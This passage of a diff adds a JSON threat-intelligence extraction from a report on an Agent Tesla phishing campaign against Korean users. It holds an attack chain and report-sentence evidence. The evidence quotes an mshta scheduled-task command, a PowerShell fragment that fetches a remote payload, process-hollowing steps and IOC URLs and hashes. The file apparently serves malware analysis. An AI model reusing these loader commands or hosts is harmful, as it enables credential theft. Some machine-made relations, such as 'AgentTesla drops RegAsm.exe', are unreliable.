+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0011",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "type": "loads",
+      "head_id": "ent_file_mshta.exe",
+      "tail_id": "ent_malware_AgentTesla",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_59"
+      ],
+      "primary_evidence_id": "ev_59",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step_id": "step_001",
+      "stage": "delivery",
+      "relation_id": "rel_0004",
+      "type": "downloads_payload",
+      "summary": "AgentTesla downloads_payload UYA-update.vbs",
+      "evidence_ids": [
+        "ev_22"
+      ]
+    },
+    {
+      "step_id": "step_002",
+      "stage": "delivery",
+      "relation_id": "rel_0005",
+      "type": "drops",
+      "summary": "AgentTesla drops RegAsm.exe",
+      "evidence_ids": [
+        "ev_64"
+      ]
+    },
+    {
+      "step_id": "step_003",
+      "stage": "execution",
+      "relation_id": "rel_0006",
+      "type": "executes",
+      "summary": "RegAsm.exe executes AgentTesla",
+      "evidence_ids": [
+        "ev_33",
+        "ev_65"
+      ]
+    },
+    {
+      "step_id": "step_004",
+      "stage": "execution",
+      "relation_id": "rel_0007",
+      "type": "executes",
+      "summary": "AgentTesla executes UYA-update.vbs",
+      "evidence_ids": [
+        "ev_22"
+      ]
+    },
+    {
+      "step_id": "step_005",
+      "stage": "execution",
+      "relation_id": "rel_0008",
+      "type": "executes",
+      "summary": "AgentTesla executes VBS/AgentTesla.VTO!tr.dldr",
+      "evidence_ids": [
+        "ev_51"
+      ]
+    },
+    {
+      "step_id": "step_006",
+      "stage": "execution",
+      "relation_id": "rel_0009",
+      "type": "loads",
+      "summary": "PowerShell.exe loads AgentTesla",
+      "evidence_ids": [
+        "ev_25",
+        "ev_61"
+      ]
+    },
+    {
+      "step_id": "step_007",
+      "stage": "execution",
+      "relation_id": "rel_0010",
+      "type": "loads",
+      "summary": "RegAsm.exe loads AgentTesla",
+      "evidence_ids": [
+        "ev_33",
+        "ev_65"
+      ]
+    },
+    {
+      "step_id": "step_008",
+      "stage": "execution",
+      "relation_id": "rel_0011",
+      "type": "loads",
+      "summary": "mshta.exe loads AgentTesla",
+      "evidence_ids": [
+        "ev_59"
+      ]
+    },
+    {
+      "step_id": "step_009",
+      "stage": "command_and_control",
+      "relation_id": "rel_0002",
+      "type": "downloads",
+      "summary": "AgentTesla downloads RegAsm.exe",
+      "evidence_ids": [
+        "ev_62"
+      ]
+    },
+    {
+      "step_id": "step_010",
+      "stage": "command_and_control",
+      "relation_id": "rel_0003",
+      "type": "downloads",
+      "summary": "AgentTesla downloads UYA-update.vbs",
+      "evidence_ids": [
+        "ev_22"
+      ]
+    }
+  ],
+  "evidences": [
+    {
+      "id": "ev_2",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s2"
+      },
+      "text": "The content of the phishing email, written in Korean, asks recipients to open the attached PowerPoint file to review a purchase order.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_5",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s5"
+      },
+      "text": "Agent Tesla is a .Net-based malware (developed in C#.Net, VB.Net, C++.Net, etc.) whose core function is to collect sensitive information from a victim’s machine, including recording keystrokes and data on the system clipboard, stealing saved software credentials (browsers, mail clients, VPN, FTP, IM, etc.), stealing browser cookies files, and taking screenshots.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_9",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s9"
+      },
+      "text": "There is no slide in the PowerPoint file, but a macro containing an auto-run function method called “Auto_Open()”.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_20",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s1"
+      },
+      "text": "This standalone VBS file downloads the Agent Tesla payload and deploys it on the victim’s system.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_21",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s2"
+      },
+      "text": "As a result, whenever the VBS file is executed it starts Agent Tesla.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_22",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s3"
+      },
+      "text": "To keep Agent Tesla alive on the victim’s system, it copies the downloaded standalone VBS file “UYA-update.vbs” into the StartMenu’s Startup folder and renames it as “GTQ.vbs”.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_24",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s5"
+      },
+      "text": "“UYA-update.vbs” continues to craft a piece of PowerShell code within a base64-decoded PE file from a local variable.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_25",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s6"
+      },
+      "text": "It is ultimately executed by “PowerShell.exe”.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_32",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s13"
+      },
+      "text": "A number of Windows API functions are called in the .Net module to deploy the Agent Tesla payload into the target process.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_33",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s14"
+      },
+      "text": "Once completed, the Agent Tesla runs on behalf of RegAsm.exe to steal the victim’s information.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_46",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s2"
+      },
+      "text": "Conclusion In this analysis, I have shown how this phishing campaign began by targeting Korean users.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_51",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s1"
+      },
+      "text": "The PowerPoint sample attached to the phishing email and the standalone VBS file are detected as \" VBA/Agent.BLY!tr \" and \" VBS/AgentTesla.VTO!tr.dldr \" and are blocked by the FortiGuard AntiVirus service.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_57",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s7"
+      },
+      "text": "[ 새 구매 주문서 .ppa / new purchase order.ppa] [UYA-update.vbs / GTQ.vbs] Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_58",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r1"
+      },
+      "text": "Figure 2.2 – The escaped VBScript code in the response packet The escaped VBScript code is executed within the current HTML document using “mshat.exe”. I will refer to this kind of VBScript as VBScript-embedded-in-HTML in this analysis. Click here to view the entire un-escaped code of the VBScript-embedded-in-HTML.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_59",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r2"
+      },
+      "text": "It consists of “mshta” and a URL, where “mshta” (“mshta.exe”) is a Windows default program that executes HTML application files, including scripts (like VBScript). The URL opened by “mshta” is redirected to another URL, “hxxps[:]//onedayiwillloveyouforever[.]blogspot.com/p/divine111.html”, which contains a piece of code used to write an escaped VBScript code to a current HTML document to be executed by “mshta.exe”.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_61",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r1"
+      },
+      "text": "“UYA-update.vbs” continues to craft a piece of PowerShell code within a base64-decoded PE file from a local variable. It is ultimately executed by “PowerShell.exe”. The decoded PE file is a .Net program that contains a function named “Run()” belonging to class “ClassLibrary3.Class1”. Below is a piece of PowerShell code used to call this function.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_62",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r2"
+      },
+      "text": "The Agent Tesla payload is fileless on the victim’s system. It is only kept in the memory of the PowerShell process. The downloaded .Net module has a function named “ClassLibrary1.Class1.Run()” that perform the process-hollowing. It passes the Agent Tesla payload in memory and adds a path of the target process “RegAsm.exe”.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_63",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r3"
+      },
+      "text": "“RegAsm.exe” is an official component of Microsoft .Net Framework. The attacker uses it as a target process in which to inject malware to protect itself from being detected.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_64",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r4"
+      },
+      "text": "CreateProcess() with CREATE_SUSPENDED flag: This creates a suspended RegAsm.exe process. VirtualAllocEx(), NtUnmapViewOfSection(), ReadProcessMemory(), WriteProcessMemory(): These move the Agent Tesla payload to a newly-allocated memory within the suspended RegAsm.exe process. SetThreadContext()/Wow64SetThreadContext(), GetThreadContext()/Wow64GetThreadContext(): These modify the RegAsm.exe’s registry value and points its EIP register to the entry point of the copied Agent Tesla payload. ResumeThread(): This resumes the execution of the RegAsm.exe process from where the EIP points to.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_65",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r5"
+      },
+      "text": "Once completed, the Agent Tesla runs on behalf of RegAsm.exe to steal the victim’s information.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_68",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r1"
+      },
+      "text": "Figure 5.2 – Example of a packet structure with packet number “6” Figure 5.2 shows an example of data with packet number “6”, which contains the basic information (“header” part) and the Stolen Data (“data” part) that is base64-encoded cookies. “0de264895c1ed90486c73c6eb110af6c2222264a0854b0047b9ead88b718f7d0\" is the Separator string that is hardcoded in Agent Tesla. The Victim ID is a MD5 hash value generated from the system’s hardware information.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_72",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r1"
+      },
+      "text": "\"hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/5X7My8/b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb/files/divine1- 2\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_74",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r3"
+      },
+      "text": "\"hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine1- 1\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_76",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r5"
+      },
+      "text": "AA121762EB34D32C7D831D7ABCEC34F5A4241AF9E669E5CC43A49A071BD6E894",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_77",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r6"
+      },
+      "text": "0BBF16E320FB942E4EA09BB9E953076A4620F59E5FFAEFC3A2FFE8B8C2B3389C",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_78",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb78"
+      },
+      "text": "Further, “mshta hxxp[:]//bitly[.]com/gdhamksgdsadj” is the value of the “soraj.bear.GroupName” which is shown in",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_79",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb79"
+      },
+      "text": "the property “GroupName” of “bear” Further, “mshta hxxp[:]//bitly[.]com/gdhamksgdsadj” is the value of the “soraj.bear.GroupName” which is shown in Figure 2, and is the content of",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_80",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb80"
+      },
+      "text": "\"\"\"\"\\\"\"\"\"MsHtA\"\"\"\"\\\"\"\"\"hxxps://madarbloghogya.blogspot.com/p/divineback222.html\"\"\"\"",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_81",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 6,
+        "section": "rule_backfill",
+        "sentence_id": "p6_rb81"
+      },
+      "text": "\"hxxps[:]//madarbloghogya[.]blogspot[.]com/p/divineback222.html\"",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_82",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb82"
+      },
+      "text": "\"\"\"update-Yendex \"\"\"\" /F /tr \"\"\"\"\\\"\"\"\"MsHtA\"\"\"\"\\\"\"\"\"hxxps://madarbloghogya.blogspot.com/p/divineback222.html\"\"\"\" Set Somosa = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_83",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 6,
+        "section": "rule_backfill",
+        "sentence_id": "p6_rb83"
+      },
+      "text": "illloveyouforever[.]blogspot[.]com/p/divine111.html\" \"hxxps[:]//madarbloghogya[.]blogspot[.]com/p/divineback222.html\" \"hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/5X7My8/b271",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_84",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "rule_backfill",
+        "sentence_id": "p3_rb84"
+      },
+      "text": "1enivid/selif/c4ab4d371cd40ce3303b4d33c868122f671fd37c/do8qxn/aygoh/steppins/0.2/ipa!/gro.tekcubtib//:sptth'))",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_85",
+      "evidence_type": "report_text",
+      "report_id": "Fortinet_Phishing-Targeting-Korean-Agent-Tesla-Variant(12-10-2021)",
+      "locator": {
+        "page": 3,
+        "section": "rule_backfill",
+        "sentence_id": "p3_rb85"
+      },
+      "text": "etMethod('Run').Invoke($null, [object[]] ('1- 1enivid/selif/c4ab4d371cd40ce3303b4d33c868122f671fd37c/do8qxn/aygoh/steppins/0.2/ipa!/gro.tekcubtib//:sptth')) The “$fuUN” variable co",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    }
+  ],
+  "structured_relation_blocks": [
+    {
+      "evidence_id": "ev_20",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_title",
+      "page": 0,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_22",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla",
+        "ent_file_UYA-update.vbs"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_62",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla",
+        "ent_file_RegAsm.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_32",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_61",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_file_PowerShell.exe",
+        "ent_file_UYA-update.vbs"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_5",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla",
+        "ent_domain_vb.net"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_33",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla",
+        "ent_file_RegAsm.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_64",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla",
+        "ent_file_RegAsm.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_65",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla",
+        "ent_file_RegAsm.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_21",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_68",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_malware_Agent_Tesla"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_51",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_malware_AgentTesla",
+        "ent_file_VBS_AgentTesla.VTO_tr.dldr"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_57",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_file_UYA-update.vbs",
+        "ent_file__.ppa"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_9",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_malware_Auto_Open"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    }
+  ]
+}
